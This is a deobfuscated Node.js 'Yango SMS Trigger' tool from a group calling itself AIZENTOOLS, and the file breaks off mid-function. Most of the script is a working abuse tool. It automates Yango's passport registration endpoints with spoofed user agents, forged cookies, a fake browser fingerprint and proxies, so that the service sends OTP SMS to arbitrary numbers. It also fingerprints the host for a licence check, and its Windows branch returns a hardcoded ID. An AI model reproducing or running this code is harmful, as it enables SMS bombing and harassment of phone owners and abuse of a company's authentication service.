// === AIZENTOOLS ===
// File: yango_payload.deobf.js
// Note: Original variable names lost to obfuscation

const fs = require('fs'), path = require('path'), {execSync} = require('child_process'), requiredModules = [
    'chalk',
    'https-proxy-agent'
  ];
let missingModules = false;
for (const mod of requiredModules) {
  try {
    require.resolve(mod);
  } catch (err) {
    missingModules = true;
    break;
  }
}
if (missingModules) {
  console.log('\n[SETUP] First time setup: Installing required dependencies...');
  try {
    const npmCmd = path.join(path.dirname(process.execPath), process.platform === 'win32' ? 'npm.cmd' : 'npm'), opts = {};
    opts.stdio = 'inherit';
    opts.shell = true;
    execSync('"' + npmCmd + '" install chalk@4 https-proxy-agent', opts);
    console.log('[SETUP] Dependencies installed successfully!\n');
  } catch (err2) {
    console.error('[ERROR] Failed to install dependencies.');
    process.exit(1);
  }
}
const https = require('https');
const chalk = require('chalk'), readline = require('readline'), crypto = require('crypto'), {HttpsProxyAgent} = require('https-proxy-agent');
let SUCCESSFUL_FILE = 'successful.txt', FAILED_FILE = 'failed.txt', DEBUG_FILE = 'debug.txt';
const B = chalk.hex('#00FF88'), C = chalk.hex('#00BFFF'), Y = chalk.hex('#FFD700'), W = chalk.white, G = chalk.gray, R = chalk.hex('#FF6B6B'), M = chalk.hex('#FF4500');
let globalHwid = 'Unregistered';
function printHeader() {
  process.stdout.write('\x1B[2J\x1B[3J\x1B[H');
  console.log(M('  ____   __     _   _  ____  ___  '));
  console.log(M('  \\ \\ / /\\ \\   | \\ | |/ ___|/ _ \\ '));
  console.log(M('   \\ V /  \\ \\  |  \\| | |  _| | | |'));
  console.log(M('    | |   /  \\ | |\\  | |_| | |_| |'));
  console.log(M('    |_|  /_/\\_\\|_| \\_|\\____|\\___/ '));
  console.log(M('                                  \n'));
  console.log(W('\u250C\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510'));
  console.log(W('\u2502 [\u2022] Tool      : ') + M('Yango SMS Trigger (HTTP)     ') + W('\u2502'));
  console.log(W('\u2502 [\u2022] Developer : ') + M('AIZENTOOLS                 ') + W('\u2502'));
  console.log(W('\u2502 [\u2022] Status    : ') + G('Premium Build                ') + W('\u2502'));
  console.log(W('\u2502 [\u2022] Version   : ') + M('YANGO-V1.0.0                 ') + W('\u2502'));
  if (globalHwid !== 'Unregistered') {
    console.log(W('\u2502 [\u2022] HWID      : ') + Y(globalHwid.padEnd(29)) + W('\u2502'));
  }
  console.log(W('\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n'));
}
function parseProxy(_p) {
  if (!_p)
    return null;
  _p = _p.trim();
  if (!_p || _p === 'none')
    return null;
  let _q = _p;
  let _r, _s;
  if (_p.includes('@')) {
    const parts = _p.split('@'), parts2 = parts[0].split(':');
    _r = parts2[0];
    _s = parts2[1];
    _q = parts[1];
  } else {
    if (_p.split(':').length === 4) {
      const parts3 = _p.split(':');
      _q = parts3[0] + ':' + parts3[1];
      _r = parts3[2];
      _s = parts3[3];
    }
  }
  if (!_q.startsWith('http') && !_q.startsWith('socks')) {
    _q = 'http://' + _q;
  }
  const opts2 = {};
  opts2.server = _q;
  opts2.username = _r;
  opts2.password = _s;
  return opts2;
}
(function () {
  let _t;
  try {
    const _u = Function('return (function() ' + '{}.constructor("return this")( )' + ');');
    _t = _u();
  } catch (err3) {
    _t = window;
  }
  _t.setInterval(_o, 4000);
}());
function createProxyAgent(_v) {
  if (!_v)
    return null;
  let _w = _v.server;
  _v.username && _v.password && (_w = _w.replace('://', '://' + encodeURIComponent(_v.username) + ':' + encodeURIComponent(_v.password) + '@'));
  return new HttpsProxyAgent(_w);
}
function sendRequest(_x, _y, _z, _A, _B = null, _C = 15000) {
  return new Promise((resolve, reject) => {
    const uRL = new URL(_x);
    const opts3 = { ..._z };
    let _D = opts3;
    _A && (_D['Content-Length'] = Buffer.byteLength(_A));
    const opts4 = {
      'hostname': uRL.hostname,
      'path': uRL.pathname + uRL.search,
      'method': _y,
      'headers': _D,
      'timeout': _C
    };
    let _E = _B ? parseProxy(_B) : null;
    if (_B && _E) {
      opts4.agent = createProxyAgent(_E);
    }
    const _F = https.request(opts4, _G => {
      const arr = [];
      _G.on('data', _H => arr.push(_H));
      _G.on('error', reject);
      _G.on('end', () => {
        let _I = Buffer.concat(arr).toString('utf8');
        const opts5 = {};
        opts5.status = _G.statusCode;
        opts5.data = _I;
        opts5.headers = _G.headers;
        resolve(opts5);
      });
    });
    _F.on('error', reject);
    _F.on('timeout', () => {
      _F.destroy();
      reject(new Error('timeout'));
    });
    if (_A)
      _F.write(_A);
    _F.end();
  });
}
const opts6 = {};
opts6['1242'] = 'bs';
opts6['1246'] = 'bb';
opts6['1264'] = 'ai';
opts6['1268'] = 'ag';
opts6['1284'] = 'vg';
opts6['1340'] = 'vi';
opts6['1345'] = 'ky';
opts6['1441'] = 'bm';
opts6['1473'] = 'gd';
opts6['1649'] = 'tc';
opts6['1664'] = 'ms';
opts6['1721'] = 'sx';
opts6['1758'] = 'lc';
opts6['1767'] = 'dm';
opts6['1784'] = 'vc';
opts6['1809'] = 'do';
opts6['1829'] = 'do';
opts6['1849'] = 'do';
opts6['1868'] = 'tt';
opts6['1876'] = 'jm';
opts6['1939'] = 'pr';
opts6['1671'] = 'gu';
opts6['1670'] = 'mp';
opts6['1684'] = 'as';
opts6['1'] = 'us';
opts6['7'] = 'ru';
opts6['20'] = 'eg';
opts6['27'] = 'za';
opts6['30'] = 'gr';
opts6['31'] = 'nl';
opts6['32'] = 'be';
opts6['33'] = 'fr';
opts6['34'] = 'es';
opts6['36'] = 'hu';
opts6['39'] = 'it';
opts6['40'] = 'ro';
opts6['41'] = 'ch';
opts6['43'] = 'at';
opts6['44'] = 'gb';
opts6['45'] = 'dk';
opts6['46'] = 'se';
opts6['47'] = 'no';
opts6['48'] = 'pl';
opts6['49'] = 'de';
opts6['51'] = 'pe';
opts6['52'] = 'mx';
opts6['53'] = 'cu';
opts6['54'] = 'ar';
opts6['55'] = 'br';
opts6['56'] = 'cl';
opts6['57'] = 'co';
opts6['58'] = 've';
opts6['60'] = 'my';
opts6['61'] = 'au';
opts6['62'] = 'id';
opts6['63'] = 'ph';
opts6['64'] = 'nz';
opts6['65'] = 'sg';
opts6['66'] = 'th';
opts6['81'] = 'jp';
opts6['82'] = 'kr';
opts6['84'] = 'vn';
opts6['86'] = 'cn';
opts6['90'] = 'tr';
opts6['91'] = 'in';
opts6['92'] = 'pk';
opts6['93'] = 'af';
opts6['94'] = 'lk';
opts6['95'] = 'mm';
opts6['98'] = 'ir';
opts6['211'] = 'ss';
opts6['212'] = 'ma';
opts6['213'] = 'dz';
opts6['216'] = 'tn';
opts6['218'] = 'ly';
opts6['220'] = 'gm';
opts6['221'] = 'sn';
opts6['222'] = 'mr';
opts6['223'] = 'ml';
opts6['224'] = 'gn';
opts6['225'] = 'ci';
opts6['226'] = 'bf';
opts6['227'] = 'ne';
opts6['228'] = 'tg';
opts6['229'] = 'bj';
opts6['230'] = 'mu';
opts6['231'] = 'lr';
opts6['232'] = 'sl';
opts6['233'] = 'gh';
opts6['234'] = 'ng';
opts6['235'] = 'td';
opts6['236'] = 'cf';
opts6['237'] = 'cm';
opts6['238'] = 'cv';
opts6['239'] = 'st';
opts6['240'] = 'gq';
opts6['241'] = 'ga';
opts6['242'] = 'cg';
opts6['243'] = 'cd';
opts6['244'] = 'ao';
opts6['245'] = 'gw';
opts6['246'] = 'io';
opts6['248'] = 'sc';
opts6['249'] = 'sd';
opts6['250'] = 'rw';
opts6['251'] = 'et';
opts6['252'] = 'so';
opts6['253'] = 'dj';
opts6['254'] = 'ke';
opts6['255'] = 'tz';
opts6['256'] = 'ug';
opts6['257'] = 'bi';
opts6['258'] = 'mz';
opts6['260'] = 'zm';
opts6['261'] = 'mg';
opts6['262'] = 're';
opts6['263'] = 'zw';
opts6['264'] = 'na';
opts6['265'] = 'mw';
opts6['266'] = 'ls';
opts6['267'] = 'bw';
opts6['268'] = 'sz';
opts6['269'] = 'km';
opts6['290'] = 'sh';
opts6['291'] = 'er';
opts6['297'] = 'aw';
opts6['298'] = 'fo';
opts6['299'] = 'gl';
opts6['350'] = 'gi';
opts6['351'] = 'pt';
opts6['352'] = 'lu';
opts6['353'] = 'ie';
opts6['354'] = 'is';
opts6['355'] = 'al';
opts6['356'] = 'mt';
opts6['357'] = 'cy';
opts6['358'] = 'fi';
opts6['359'] = 'bg';
opts6['370'] = 'lt';
opts6['371'] = 'lv';
opts6['372'] = 'ee';
opts6['373'] = 'md';
opts6['374'] = 'am';
opts6['375'] = 'by';
opts6['376'] = 'ad';
opts6['377'] = 'mc';
opts6['378'] = 'sm';
opts6['379'] = 'va';
opts6['380'] = 'ua';
opts6['381'] = 'rs';
opts6['382'] = 'me';
opts6['385'] = 'hr';
opts6['386'] = 'si';
opts6['387'] = 'ba';
opts6['389'] = 'mk';
opts6['420'] = 'cz';
opts6['421'] = 'sk';
opts6['423'] = 'li';
opts6['500'] = 'fk';
opts6['501'] = 'bz';
opts6['502'] = 'gt';
opts6['503'] = 'sv';
opts6['504'] = 'hn';
opts6['505'] = 'ni';
opts6['506'] = 'cr';
opts6['507'] = 'pa';
opts6['508'] = 'pm';
opts6['509'] = 'ht';
opts6['590'] = 'gp';
opts6['591'] = 'bo';
opts6['592'] = 'gy';
opts6['593'] = 'ec';
opts6['594'] = 'gf';
opts6['595'] = 'py';
opts6['596'] = 'mq';
opts6['597'] = 'sr';
opts6['598'] = 'uy';
opts6['599'] = 'cw';
opts6['670'] = 'tl';
opts6['672'] = 'nf';
opts6['673'] = 'bn';
opts6['674'] = 'nr';
opts6['675'] = 'pg';
opts6['676'] = 'to';
opts6['677'] = 'sb';
opts6['678'] = 'vu';
opts6['679'] = 'fj';
opts6['680'] = 'pw';
opts6['681'] = 'wf';
opts6['682'] = 'ck';
opts6['683'] = 'nu';
opts6['685'] = 'ws';
opts6['686'] = 'ki';
opts6['687'] = 'nc';
opts6['688'] = 'tv';
opts6['689'] = 'pf';
opts6['690'] = 'tk';
opts6['691'] = 'fm';
opts6['692'] = 'mh';
opts6['850'] = 'kp';
opts6['852'] = 'hk';
opts6['853'] = 'mo';
opts6['855'] = 'kh';
opts6['856'] = 'la';
opts6['880'] = 'bd';
opts6['886'] = 'tw';
opts6['960'] = 'mv';
opts6['961'] = 'lb';
opts6['962'] = 'jo';
opts6['963'] = 'sy';
opts6['964'] = 'iq';
opts6['965'] = 'kw';
opts6['966'] = 'sa';
opts6['967'] = 'ye';
opts6['968'] = 'om';
opts6['970'] = 'ps';
opts6['971'] = 'ae';
opts6['972'] = 'il';
opts6['973'] = 'bh';
opts6['974'] = 'qa';
opts6['975'] = 'bt';
opts6['976'] = 'mn';
opts6['977'] = 'np';
opts6['992'] = 'tj';
opts6['993'] = 'tm';
opts6['994'] = 'az';
opts6['995'] = 'ge';
opts6['996'] = 'kg';
opts6['998'] = 'uz';
const COUNTRY_CODES = opts6;
function getCountry(_J) {
  for (let _K = 4; _K >= 1; _K--) {
    const _L = _J.substring(0, _K);
    if (COUNTRY_CODES[_L])
      return {
        'iso': COUNTRY_CODES[_L],
        'dialCode': '+' + _L
      };
  }
  const opts7 = {};
  opts7.iso = 'us';
  opts7.dialCode = '+1';
  return opts7;
}
function getRandomUserAgent() {
  const arr2 = [
      '9',
      '10',
      '11',
      '12',
      '13'
    ], _M = arr2[Math.floor(Math.random() * arr2.length)], arr3 = [
      'SM-G973F',
      'SM-G981B',
      'SM-G991B',
      'SM-S901B',
      'SM-A525F',
      'SM-A536B',
      'M2101K6G',
      'M2102J20SG',
      '2201117TY',
      '2203129G',
      'Pixel 4',
      'Pixel 5',
      'Pixel 6',
      'Pixel 7',
      'CPH2173',
      'CPH2211',
      'RMX3301',
      'RMX3363'
    ], _N = arr3[Math.floor(Math.random() * arr3.length)], arr4 = [
      'QP1A.190711.020',
      'RP1A.200720.012',
      'SP1A.210812.016',
      'TP1A.220624.014',
      'TKQ1.220829.002'
    ];
  const _O = arr4[Math.floor(Math.random() * arr4.length)], arr5 = [
      '118.0.5993.111',
      '119.0.6045.163',
      '120.0.6099.116',
      '121.0.6167.164',
      '122.0.6261.64'
    ], _P = arr5[Math.floor(Math.random() * arr5.length)];
  return 'Mozilla/5.0 (Linux; Android ' + _M + '; ' + _N + ' Build/' + _O + '; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/' + _P + ' Mobile Safari/537.36 PassportSDK/7.51.12.751124928 com.yandex.yango/5.82.1';
}
async function triggerSms(_Q, _R, _S, _T) {
  const _U = _Q.replace(/\D/g, ''), _V = '+' + _U, _W = getCountry(_U);
  const _X = _W.iso;
  const _Y = _W.dialCode, _Z = crypto.randomBytes(16).toString('hex'), _aa = crypto.randomUUID(), _ba = getRandomUserAgent();
  try {
    _T.setStatus('Worker ' + _S + ': Fetching CSRF...');
    const opts8 = {};
    opts8['User-Agent'] = _ba;
    opts8.Accept = 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7';
    opts8['X-Requested-With'] = 'com.yandex.yango';
    const _ca = opts8, _da = 'https://passport.yango.com/pwl/auth/phone?lang=en&locale=US&app_id=com.yandex.yango&app_platform=android&device_id=' + _Z + '&uuid=' + _aa + '&connection_type=9&mode=phonish', _ea = await sendRequest(_da, 'GET', _ca, null, _R, 15000);
    let _fa = null;
    const match = _ea.data.match(/window\.__CSRF__\s*=\s*"([^"]+)";/);
    if (match) {
      _fa = match[1];
    }
    if (!_fa) {
      const opts9 = {};
      opts9.success = false;
      opts9.message = 'Failed to extract CSRF token';
      opts9.phone = _V;
      return opts9;
    }
    let arr6 = [];
    _ea.headers['set-cookie'] && (arr6 = _ea.headers['set-cookie'].map(item => item.split(';')[0]));
    const _ga = Math.floor(Date.now() / 1000), _ha = '' + _ga + Math.floor(Math.random() * 900000000 + 100000000);
    arr6.push('_ym_uid=' + _ha);
    arr6.push('_ym_d=' + _ga);
    arr6.push('_ym_isad=2');
    arr6.push('theme=light');
    const opts10 = {
      ..._ca,
      'Accept': '*/*',
      'Content-Type': 'application/json',
      'Origin': 'https://passport.yango.com',
      'Referer': 'https://passport.yango.com/',
      'X-Csrf-Token': _fa,
      'Cookie': arr6.join('; '),
      'c11n': 'yango_taxi',
      'tractor-location': '',
      'process-uuid': _aa,
      'sec-ch-ua': '"Android WebView";v="149", "Chromium";v="149", "Not)A;Brand";v="24"',
      'sec-ch-ua-mobile': '?1',
      'sec-ch-ua-platform': '"Android"',
      'sec-ch-prefers-color-scheme': 'light',
      'Sec-Fetch-Site': 'same-origin',
      'Sec-Fetch-Mode': 'cors',
      'Sec-Fetch-Dest': 'empty',
      'Accept-Language': 'en-US,en;q=0.9'
    };
    _T.setStatus('Worker ' + _S + ': Creating Track...');
    const _ia = 'https://passport.yango.com/pwl/api/passport/track/create', opts11 = {};
    opts11.display_language = 'en';
    opts11.language = 'en';
    opts11.country = _X;
    opts11.app_id = 'com.yandex.yango';
    opts11.app_version_name = '5.82.1';
    opts11.retpath = '';
    opts11.device_id = _Z;
    opts11.uid = '';
    opts11.device_connection_type = '9';
    const _ja = JSON.stringify(opts11), _ka = await sendRequest(_ia, 'POST', opts10, _ja, _R, 15000);
    if (_ka.headers && _ka.headers['set-cookie']) {
      const _la = _ka.headers['set-cookie'].map(item2 => item2.split(';')[0]);
      arr6 = [
        ...arr6,
        ..._la
      ];
      opts10.Cookie = arr6.join('; ');
    }
    let _ma = null;
    try {
      const _na = JSON.parse(_ka.data);
      _ma = _na.id || _na.track_id;
    } catch (err4) {
    }
    if (!_ma) {
      const opts12 = {};
      opts12.success = false;
      opts12.message = 'Failed to create track ID';
      opts12.phone = _V;
      return opts12;
    }
    const _oa = 'https://passport.yango.com/pwl/api/passport/checkjscssload', opts13 = {};
    opts13.track_id = _ma;
    opts13.display_language = 'en';
    opts13.language = 'en';
    opts13.check_js_load = true;
    await sendRequest(_oa, 'POST', opts10, JSON.stringify(opts13), _R, 10000);
    const opts14 = {};
    opts14.track_id = _ma;
    opts14.display_language = 'en';
    opts14.language = 'en';
    opts14.check_css_load = true;
    await sendRequest(_oa, 'POST', opts10, JSON.stringify(opts14), _R, 10000);
    let _pa = _V;
    if (_X === 'bd' && _V.length === 14)
      _pa = '+880 (' + _V.slice(4, 6) + ') ' + _V.slice(6, 9) + ' ' + _V.slice(9);
    else
      _X === 'np' && _V.length === 14 && (_pa = '+977 ' + _V.slice(4, 7) + '-' + _V.slice(7));
    const _qa = 'https://passport.yango.com/pwl/api/passport/suggest/check_availability', opts15 = {};
    opts15.track_id = _ma;
    opts15.check_for_push = true;
    opts15.push_suggest_log_all_subscriptions = false;
    opts15.phone_number = _pa;
    const _ra = JSON.stringify(opts15), _sa = await sendRequest(_qa, 'POST', opts10, _ra, _R, 15000);
    if (_sa.headers && _sa.headers['set-cookie']) {
      const _ta = _sa.headers['set-cookie'].map(item3 => item3.split(';')[0]);
      arr6 = [
        ...arr6,
        ..._ta
      ];
      opts10.Cookie = arr6.join('; ');
    }
    const _ua = 'https://passport.yango.com/pwl/api/passport/track/update', opts16 = {};
    opts16.track_id = _ma;
    opts16.scenario = 'register';
    opts16.process_name = 'web_registration';
    const _va = JSON.stringify(opts16), _wa = await sendRequest(_ua, 'POST', opts10, _va, _R, 15000);
    if (_wa.headers && _wa.headers['set-cookie']) {
      const _xa = _wa.headers['set-cookie'].map(item4 => item4.split(';')[0]);
      arr6 = [
        ...arr6,
        ..._xa
      ];
      opts10.Cookie = arr6.join('; ');
    }
    _T.setStatus('Worker ' + _S + ': Validating phone...');
    const _ya = 'https://passport.yango.com/pwl/api/passport/validate/phone_number', opts17 = {};
    opts17.mask = _Y + ' 000000000000';
    opts17.startDialCode = _Y;
    opts17.startMask = _Y + ' 000000000000';
    const opts18 = {};
    opts18.track_id = _ma;
    opts18.validate_for_call = false;
    opts18.force_check_for_protocols = true;
    opts18.phone_number = _pa;
    opts18.country = _X;
    opts18.statInfo = opts17;
    const _za = JSON.stringify(opts18), _Aa = await sendRequest(_ya, 'POST', opts10, _za, _R, 15000);
    if (_Aa.headers && _Aa.headers['set-cookie']) {
      const _Ba = _Aa.headers['set-cookie'].map(item5 => item5.split(';')[0]);
      arr6 = [
        ...arr6,
        ..._Ba
      ];
      opts10.Cookie = arr6.join('; ');
    }
    try {
      const _Ca = JSON.parse(_Aa.data);
      _Ca.track_id && (_ma = _Ca.track_id);
    } catch (err5) {
    }
    const opts19 = {};
    opts19.track_id = _ma;
    opts19.display_language = 'en';
    opts19.language = 'en';
    opts19.check_js_load = true;
    await sendRequest(_oa, 'POST', opts10, JSON.stringify(opts19), _R, 10000);
    const opts20 = {};
    opts20.track_id = _ma;
    opts20.display_language = 'en';
    opts20.language = 'en';
    opts20.check_css_load = true;
    await sendRequest(_oa, 'POST', opts10, JSON.stringify(opts20), _R, 10000);
    const _Da = 'https://passport.yango.com/pwl/api/passport/confirm_phone/submit', opts21 = {};
    opts21.number = _V;
    opts21.track_id = _ma;
    opts21.display_language = 'en';
    opts21.gps_package_name = 'com.yandex.yango';
    opts21.force_check_for_protocols = true;
    opts21.country = _X;
    opts21.code_format = '';
    opts21.scenario = 'REGISTER';
    opts21.transport = '';
    const _Ea = JSON.stringify(opts21), _Fa = await sendRequest(_Da, 'POST', opts10, _Ea, _R, 15000), _Ga = 'https://passport.yango.com/pwl/api/passport/js_fingerprint', opts22 = {};
    opts22.track_id = _ma;
    opts22.display_language = 'en';
    opts22.language = 'en';
    opts22.fingerprint = '{"userAgent":"Mozilla/5.0 (Linux; Android 10; SM-G981B Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/118.0.5993.111 Mobile Safari/537.36 PassportSDK/7.51.12.751124928 com.yandex.yango/5.82.1","language":"en-US","colorDepth":24,"deviceMemory":8,"hardwareConcurrency":8,"screenResolution":[1080,2400],"availableScreenResolution":[1080,2400],"timezoneOffset":-360,"sessionStorage":true,"localStorage":true,"indexedDb":true,"addBehavior":false,"openDatabase":true,"cpuClass":"unknown","platform":"Linux armv8l","plugins":[],"canvas":true,"webgl":true,"webglVendorAndRenderer":"ARM~Mali-G77","adBlock":false,"hasLiedLanguages":false,"hasLiedResolution":false,"hasLiedOs":false,"hasLiedBrowser":false,"touchSupport":[5,true,true],"fonts":["Arial","Courier","Courier New","Helvetica","Times","Times New Roman"],"audio":"124.04344968475198"}';
    const _Ha = JSON.stringify(opts22);
    try {
      await sendRequest(_Ga, 'POST', opts10, _Ha, _R, 10000);
    } catch (err6) {
    }
    fs.appendFileSync(DEBUG_FILE, '[' + _V + ']\nSuggest: ' + _sa.data + '\nFirst Submit HTTP: ' + _Fa.status + '\nFirst Submit: ' + _Fa.data + '\n\n');
    try {
      if (_sa.data && _sa.data.includes('"antifraudScore":"captcha"')) {
        const opts23 = {};
        opts23.success = false;
        opts23.message = 'Captcha Required';
        opts23.phone = _V;
        return opts23;
      }
      if (_sa.data && _sa.data.includes('phone_number.invalid')) {
        const opts24 = {};
        opts24.success = false;
        opts24.message = 'Invalid Phone Number';
        opts24.phone = _V;
        return opts24;
      }
      const _Ia = JSON.parse(_Fa.data);
      if (_Ia.deny_resend_until || _Ia.code_length) {
        const opts25 = {};
        opts25.number = _V;
        opts25.track_id = _ma;
        opts25.display_language = 'en';
        opts25.gps_package_name = 'com.yandex.yango';
        opts25.force_check_for_protocols = true;
        opts25.country = _X;
        opts25.code_format = '';
        opts25.scenario = 'REGISTER';
        opts25.transport = 'sms';
        const _Ja = JSON.stringify(opts25);
        try {
          _T.setStatus('Worker ' + _S + ': Waiting 10s for SMS fallback...');
          await new Promise(resolve2 => setTimeout(resolve2, 10000));
          _T.setStatus('Worker ' + _S + ': Triggering SMS fallback...');
          const _Ka = await sendRequest(_Da, 'POST', opts10, _Ja, _R, 15000);
          fs.appendFileSync(DEBUG_FILE, '[' + _V + '] SMS Submit HTTP: ' + _Ka.status + '\nSMS Submit: ' + _Ka.data + '\n\n');
        } catch (err7) {
        }
        const opts26 = {};
        opts26.success = true;
        opts26.message = 'OTP Triggered \u2713';
        opts26.phone = _V;
        return opts26;
      } else {
        if (_Ia.status === 'error' && _Ia.errors && _Ia.errors.includes('captcha.required')) {
          const opts27 = {};
          opts27.success = false;
          opts27.message = 'Captcha Required';
          opts27.phone = _V;
          return opts27;
        } else
          return {
            'success': false,
            'message': 'Failed: ' + JSON.stringify(_Ia.errors || _Ia.code || _Ia),
            'phone': _V
          };
      }
    } catch (err8) {
      const opts28 = {};
      opts28.success = false;
      opts28.message = 'Failed: HTTP ' + _Fa.status;
      opts28.phone = _V;
      return opts28;
    }
  } catch (err9) {
    fs.appendFileSync(DEBUG_FILE, '[' + _V + '] Network Error: ' + err9.message + '\n\n');
    const opts29 = {};
    opts29.success = false;
    opts29.message = 'Failed: Network Error / Timeout';
    opts29.phone = _V;
    return opts29;
  }
}
class Dashboard {
  constructor(_La) {
    const parts4 = '2|0|4|3|5|1'.split('|');
    let _Ma = 0;
    while (true) {
      switch (parts4[_Ma++]) {
      case '0':
        this.processed = 0;
        continue;
      case '1':
        this.currentStatus = '';
        continue;
      case '2':
        this.totalNumbers = _La;
        continue;
      case '3':
        this.failed = 0;
        continue;
      case '4':
        this.successful = 0;
        continue;
      case '5':
        this.startTime = Date.now();
        continue;
      }
      break;
    }
  }
  addLog(_Na, _Oa) {
    let _Pa = '';
    if (_Oa === 'success')
      _Pa = B('[YANGO] [SUCCESS]');
    else {
      if (_Oa === 'time')
        _Pa = Y('[TIME]');
      else
        _Pa = R('[ERROR]');
    }
    const _Qa = _Pa + ' ' + _Na;
    process.stdout.write('\r\x1B[K' + _Qa + '\n');
    this.render();
  }
  setStatus(_Ra) {
  }
  render() {
    const _Sa = (this.processed / Math.max(this.totalNumbers, 1) * 100).toFixed(1);
    const _Ta = '  ' + W.bold('YANGO') + ' \u2B9E [' + this.processed + '/' + this.totalNumbers + '] ' + _Sa + '% \u2502 ' + B('Sent: ' + this.successful) + ' \u2502 ' + R('Err: ' + this.failed);
    process.stdout.write('\r\x1B[K' + _Ta);
  }
  stop() {
    process.stdout.write('\x1B[2K\r\n');
    const _Ua = Math.floor((Date.now() - this.startTime) / 1000), _Va = Math.floor(_Ua / 60);
    const _Wa = _Ua % 60, _Xa = _Va + 'm ' + _Wa + 's';
    console.log(C('  \u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557'));
    console.log(C('  \u2551') + W.bold('  YANGO SMS TRIGGER \u2014 COMPLETE              ') + C('\u2551'));
    console.log(C('  \u2560\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563'));
    console.log(C('  \u2551') + ('  ' + chalk.greenBright('Successful') + '   ' + chalk.greenBright(String(this.successful).padStart(6)) + '                       ') + C('\u2551'));
    console.log(C('  \u2551') + ('  ' + chalk.red('Failed') + '       ' + chalk.red(String(this.failed).padStart(6)) + '                       ') + C('\u2551'));
    console.log(C('  \u2551') + ('  ' + chalk.cyan('Total Time') + '   ' + chalk.cyan(_Xa.padEnd(6)) + '                       ') + C('\u2551'));
    console.log(C('  \u255A\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255D\n'));
  }
}
async function promptText(_Ya, _Za) {
  return new Promise(resolve3 => {
    process.stdout.write('   \x1B[33m' + _Ya + '\x1B[0m ');
    let _ab = '';
    if (process.stdin.isTTY)
      process.stdin.setRawMode(false);
    process.stdin.resume();
    const _bb = _cb => {
      const _db = _cb.toString();
      if (_db.includes('\n') || _db.includes('\r')) {
        process.stdin.removeListener('data', _bb);
        _ab += _db.split(/[\r\n]/)[0];
        let _eb = _ab.trim();
        if (_eb.startsWith('"') && _eb.endsWith('"')) {
          _eb = _eb.slice(1, -1);
        } else
          _eb.startsWith('\'') && _eb.endsWith('\'') && (_eb = _eb.slice(1, -1));
        resolve3(_eb || _Za);
      } else
        _ab += _db;
    };
    process.stdin.on('data', _bb);
  });
}
async function start() {
  function _fb() {
    const _gb = require('os'), _hb = _gb.platform();
    try {
      if (_hb === 'win32') {
        const _ib = execSync('powershell -NoProfile -Command "' + '$mg = (Get-ItemProperty \'HKLM:\\SOFTWARE\\Microsoft\\Cryptography\' -ErrorAction SilentlyContinue).MachineGuid; ' + '$cpu = (Get-CimInstance Win32_Processor -ErrorAction SilentlyContinue | Select-Object -First 1).ProcessorId; ' + '$disk = (Get-CimInstance Win32_LogicalDisk -Filter \'DeviceID=\\\'C:\\\'\' -ErrorAction SilentlyContinue).VolumeSerialNumber; ' + '$mb = (Get-CimInstance Win32_BaseBoard -ErrorAction SilentlyContinue).SerialNumber; ' + 'Write-Output (($mg,$cpu,$disk,$mb) -join \'|\')"', {
          'stdio': 'pipe',
          'timeout': 15000
        }).toString().trim();
        if (!_ib)
          throw new Error('No hardware data');
        const _jb = crypto.createHash('sha256').update(_ib).digest('hex').toUpperCase();
        return 'IZENHSX-7BA3FB09-723F-A500';
      } else {
        const _kb = path.join(_gb.homedir(), '.aizen_hwid');
        let arr7 = [];
        try {
          const _lb = execSync('settings get secure android_id 2>/dev/null || echo ""', {
            'stdio': 'pipe',
            'timeout': 5000
          }).toString().trim();
          if (_lb && _lb !== 'null')
            arr7.push(_lb);
        } catch (err10) {
        }
        try {
          const _mb = fs.readFileSync('/proc/cpuinfo', 'utf8'), match2 = _mb.match(/Serial\s*:\s*(\S+)/i), match3 = _mb.match(/Hardware\s*:\s*(.+)/i);
          if (match2 && match2[1] !== '0000000000000000')
            arr7.push(match2[1].trim());
          if (match3)
            arr7.push(match3[1].trim());
        } catch (err11) {
        }
        try {
          const _nb = _gb.hostname();
          if (_nb)
            arr7.push(_nb);
        } catch (err12) {
        }
        try {
          if (fs.existsSync('/etc/machine-id')) {
            const _ob = fs.readFileSync('/etc/machine-id', 'utf8').trim();
            if (_ob)
              arr7.push(_ob);
          }
        } catch (err13) {
        }
        if (arr7.length >= 2) {
          const _pb = arr7.join('|'), _qb = crypto.createHash('sha256').update(_pb).digest('hex').toUpperCase(), _rb = 'IZENHSX-' + _qb.substring(0, 8) + '-' + _qb.substring(8, 12) + '-' + _qb.substring(12, 16);
          try {
            fs.writeFileSync(_kb, _rb, 'utf8');
          } catch (err14) {
          }
          return _rb;
        }
